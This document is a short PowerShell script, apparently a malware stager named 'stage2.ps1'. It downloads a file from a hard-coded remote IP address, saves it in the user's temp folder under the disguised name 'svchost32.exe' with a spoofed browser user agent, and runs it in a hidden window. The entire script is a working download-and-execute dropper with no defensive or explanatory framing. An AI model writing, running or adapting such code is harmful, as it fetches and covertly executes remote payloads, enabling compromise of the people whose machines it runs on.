
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.196/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\svchost32.exe",
    [int]$RequestTimeout = 80,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Get-Stage2Payload -SourceUrl $RemoteUrl -DestinationPath $PayloadPath -TimeoutSec $RequestTimeout -UserAgent $BrowserAgent
if ($ResultObject) {
    Start-Process -FilePath $PayloadPath -WindowStyle Hidden
}

Write-Verbose "stage marker 17 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
